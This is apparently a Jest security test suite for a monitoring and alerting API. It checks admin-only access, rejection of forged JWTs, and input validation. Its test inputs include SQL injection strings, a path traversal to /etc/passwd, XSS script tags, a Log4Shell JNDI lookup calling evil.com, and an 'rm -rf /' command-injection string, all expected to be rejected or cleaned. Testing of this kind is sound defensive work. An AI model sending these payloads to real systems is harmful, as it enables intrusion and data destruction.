/**
 * 监控系统安全测试
 * 测试性能监控和安全监控功能的安全漏洞
 */

import { UserRole } from "../../../../src/auth/enums/user-role.enum";

describe("Monitoring Security Tests", () => {

  let request: any;
  let adminToken: string;
  let userToken: string;
  let adminApiKey: { appKey: string; accessToken: string };

  beforeEach(async () => {
    global.getSecurityApp();
    request = global.createSecurityRequest();

    // 为每个测试创建认证过的用户和API Key，确保测试隔离
    // 使用动态生成的用户名避免重复键冲突
    const { token: adminUserToken } = await global.createAuthenticatedUser({
      role: UserRole.ADMIN,
    });
    adminToken = adminUserToken;

    const { token: developerUserToken } = await global.createAuthenticatedUser({
      role: UserRole.DEVELOPER,
    });
    userToken = developerUserToken;

    adminApiKey = await global.createTestAdminApiKey();
  }, 30000);

  describe("Monitoring Endpoint Access Control", () => {
    const adminOnlyEndpoints = [
      // MonitoringController endpoints
      "/api/v1/monitoring/performance",
      "/api/v1/monitoring/endpoints",
      "/api/v1/monitoring/database",
      "/api/v1/monitoring/redis",
      "/api/v1/monitoring/system",
      "/api/v1/monitoring/dashboard",
      // 告警相关端点现在由 AlertController 管理
      "/api/v1/alerts/active",
      "/api/v1/alerts/history",
      // SecurityController endpoints
      "/api/v1/security/vulnerabilities",
      "/api/v1/security/audit/events",
      "/api/v1/security/dashboard",
    ];

    it("应该阻止未认证用户访问监控端点", async () => {
      for (const endpoint of adminOnlyEndpoints) {
        const response = await request.get(endpoint);
        expect(response.status).toBe(401);
      }
    });

    it("应该阻止普通用户访问管理员监控端点", async () => {
      for (const endpoint of adminOnlyEndpoints) {
        const response = await request
          .get(endpoint)
          .set("Authorization", `Bearer ${userToken}`);

        expect([401, 403]).toContain(response.status);
      }
    });

    it("应该允许管理员访问监控端点", async () => {
      const jwtEndpoints = [
        "/api/v1/monitoring/performance",
        "/api/v1/monitoring/endpoints",
        "/api/v1/monitoring/database",
        "/api/v1/monitoring/redis",
        "/api/v1/monitoring/system",
        "/api/v1/monitoring/dashboard",
        // 告警相关端点
        "/api/v1/alerts/active",
        "/api/v1/alerts/history",
      ];

      const apiKeyEndpoints = [
        "/api/v1/security/vulnerabilities",
        "/api/v1/security/audit/events",
        "/api/v1/security/dashboard",
      ];

      for (const endpoint of jwtEndpoints) {
        const response = await request
          .get(endpoint)
          .set("Authorization", `Bearer ${adminToken}`);
        expect([200, 503]).toContain(response.status);
      }

      for (const endpoint of apiKeyEndpoints) {
        const response = await request
          .get(endpoint)
          .set("x-app-key", adminApiKey.appKey)
          .set("x-access-token", adminApiKey.accessToken);
        expect([200, 503]).toContain(response.status);
      }
    });

    it("应该防护JWT令牌权限提升", async () => {
      // 创建一个拥有普通用户角色的令牌
      const baseUserToken = await global.createTestJWTToken({
        role: UserRole.DEVELOPER,
        sub: "test-user-id",
      });

      // 尝试伪造令牌
      const manipulatedTokens = [
        // 1. 无效签名 - 将签名部分替换为任意字符串
        baseUserToken.substring(0, baseUserToken.lastIndexOf(".") + 1) +
          "invalid-signature",
        // 2. 伪造 payload - 尝试将角色更改为 'admin' 但不更新签名
        baseUserToken.split(".")[0] +
          "." +
          Buffer.from(JSON.stringify({ role: "admin" })).toString("base64") +
          "." +
          baseUserToken.split(".")[2],
        // 3. 附加恶意数据 - 虽然通常会被库忽略，但也是一种测试
        baseUserToken + ".malicious",
      ];

      for (const token of manipulatedTokens) {
        const response = await request
          .get("/api/v1/monitoring/dashboard")
          .set("Authorization", `Bearer ${token}`);

        // 所有伪造的令牌都应该被拒绝
        expect(response.status).toBe(401);
      }
    });
  });

  describe("Monitoring Data Security", () => {
    it("应该不泄露敏感系统信息", async () => {
      const response = await request
        .get("/api/v1/monitoring/health")
        .set("Authorization", `Bearer ${adminToken}`);

      if (response.status === 200) {
        const responseText = JSON.stringify(response.body);

        // 不应该泄露敏感的系统信息
        expect(responseText).not.toContain("password");
        expect(responseText).not.toContain("secret");
        expect(responseText).not.toContain("DB_HOST");
        expect(responseText).not.toContain("REDIS_URL");
      }
    });

    it("应该防护监控数据查询注入攻击", async () => {
      const maliciousParams = [
        "critical; DROP TABLE alerts; --",
        "../../../etc/passwd",
        '<script>alert("XSS")</script>',
        "${jndi:ldap://evil.com/a}",
      ];

      for (const param of maliciousParams) {
        const response = await request
          .get("/api/v1/alerts/active") // 修正: 使用新的告警端点
          .query({ severity: param })
          .set("Authorization", `Bearer ${adminToken}`);

        // 应该拒绝恶意查询
        expect(response.status).toBe(400);

        // 响应消息可能是来自 SecurityMiddleware 的通用拦截消息，也可能是来自 Controller 的具体校验消息
        const message = response.body.message || "";
        const isSecurityViolation =
          message.includes("不安全的内容") || message.includes("验证失败"); // 修正：适配新的验证错误消息
        const isInvalidSeverity =
          message.includes("无效的告警级别") ||
          message.includes("必须是有效的枚举值");
        expect(isSecurityViolation || isInvalidSeverity).toBe(true);
      }
    });

    it("应该限制监控查询范围防止数据泄露", async () => {
      const response = await request
        .get("/api/v1/alerts/history") // 修正: 使用新的告警历史端点
        .set("Authorization", `Bearer ${adminToken}`)
        .query({
          limit: 101, // 超出最大限制 (新限制为100)
        });

      expect(response.status).toBe(400);
      expect(response.body.message).toContain(
        "limit must not be greater than 100",
      ); // 修正：根据新的验证规则调整
    });

    it("应该防护安全审计事件的手动注入", async () => {
      const maliciousEvent = {
        type: "authentication",
        severity: "high",
        action: "login_failure",
        clientIP: "127.0.0.1",
        userAgent: "malicious-agent",
        details: {
          username: "test-user",
          reason: "Attempted command injection: ; rm -rf /",
        },
        outcome: "blocked",
      };

      const response = await request
        .post("/api/v1/security/manual-events")
        .set("x-app-key", adminApiKey.appKey)
        .set("x-access-token", adminApiKey.accessToken)
        .send(maliciousEvent);

      // 应该成功记录事件，但内容会被清理
      expect(response.status).toBe(201);

      // 检查存储的日志，确保恶意代码被移除
      const auditResponse = await request
        .get("/api/v1/security/audit/events")
        .set("x-app-key", adminApiKey.appKey)
        .set("x-access-token", adminApiKey.accessToken)
        .query({ limit: 1, type: "authentication" });

      if (
        auditResponse.status === 200 &&
        auditResponse.body?.events?.length > 0
      ) {
        const eventText = JSON.stringify(auditResponse.body.events[0]);
        expect(eventText).not.toContain("rm -rf");
      }
    });
  });

  describe("Security Monitoring Attacks", () => {
    it("应该防护安全日志注入", async () => {
      const maliciousLogs = [
        "Normal log\nFAKE ALERT: Admin login from 192.168.1.1",
        "Log entry with\\x00null bytes\\x01\\x02",
      ];

      for (const log of maliciousLogs) {
        await request.post("/api/v1/auth/login").send({
          username: log,
          password: "password123",
        });

        const auditResponse = await request
          .get("/api/v1/security/audit/events")
          .set("Authorization", `Bearer ${adminToken}`)
          .query({ type: "authentication", limit: 5 });

        if (auditResponse.status === 200 && auditResponse.body.events) {
          const auditText = JSON.stringify(auditResponse.body.events);
          expect(auditText).not.toContain("FAKE ALERT");
          expect(auditText).not.toContain("\\x00");
        }
      }
    });

    it("应该防护安全扫描结果查询注入", async () => {
      const maliciousQuery = "high; DROP TABLE scan_results; --";

      const response = await request
        .get("/api/v1/security/vulnerabilities")
        .set("x-app-key", adminApiKey.appKey)
        .set("x-access-token", adminApiKey.accessToken)
        .query({ severity: maliciousQuery });

      expect(response.status).toBe(400);
    });

    it.skip("应该限制安全扫描频率防止DoS", async () => {
      const scanRequests = Array(5)
        .fill(0)
        .map(
          () =>
            request
              .post("/api/v1/security/scan")
              .set("x-app-key", adminApiKey.appKey)
              .set("x-access-token", adminApiKey.accessToken)
              .send({}), // 添加 body 以确保 Content-Type header 被设置
        );

      const responses = await Promise.all(scanRequests);

      const rateLimitedCount = responses.filter((r) => r.status === 429).length;
      expect(rateLimitedCount).toBeGreaterThan(0);
    });
  });

  describe("Monitoring Performance Security", () => {
    it("应该防护端点指标查询注入", async () => {
      const maliciousSortBy =
        'averageResponseTime; UPDATE users SET role = "admin"; --';

      const response = await request
        .get("/api/v1/monitoring/endpoints")
        .set("Authorization", `Bearer ${adminToken}`)
        .query({ sortBy: maliciousSortBy });

      expect(response.status).toBe(400);
      expect(response.body.message).toContain("无效的排序字段");
    });

    it("应该防护监控查询时间炸弹", async () => {
      const veryLargeTimeRangeResponse = await request
        .get("/api/v1/security/audit/events")
        .set("x-app-key", adminApiKey.appKey)
        .set("x-access-token", adminApiKey.accessToken)
        .query({
          startDate: "1000-01-01T00:00:00Z",
          endDate: "9999-12-31T23:59:59Z",
        });

      // 应该拒绝过大的时间范围查询
      expect(veryLargeTimeRangeResponse.status).toBe(400);
      expect(veryLargeTimeRangeResponse.body.message).toContain(
        "验证失败: 无效的时间范围",
      );
    });
  });

  describe("Dashboard Security", () => {
    it("应该对仪表板查询参数进行XSS防护", async () => {
      const xssPayload = '<script>alert("XSS")</script>';
      const response = await request
        .get("/api/v1/monitoring/dashboard")
        .set("Authorization", `Bearer ${adminToken}`)
        .query({ filter: xssPayload });

      // 假设仪表板端点会验证其查询参数
      // 如果没有特定的验证，它可能会成功返回200，但我们期望它至少被记录或清理
      if (response.status === 200) {
        // 如果成功，检查审计日志中是否记录了被清理的输入
        const auditResponse = await request
          .get("/api/v1/security/audit/events")
          .set("Authorization", `Bearer ${adminToken}`)
          .query({ limit: 1, type: "suspicious_activity" });

        if (
          auditResponse.status === 200 &&
          auditResponse.body?.events?.length > 0
        ) {
          const eventText = JSON.stringify(auditResponse.body.events[0]);
          expect(eventText).not.toContain("<script>");
        }
      } else {
        expect([400, 422]).toContain(response.status);
      }
    });
  });
});
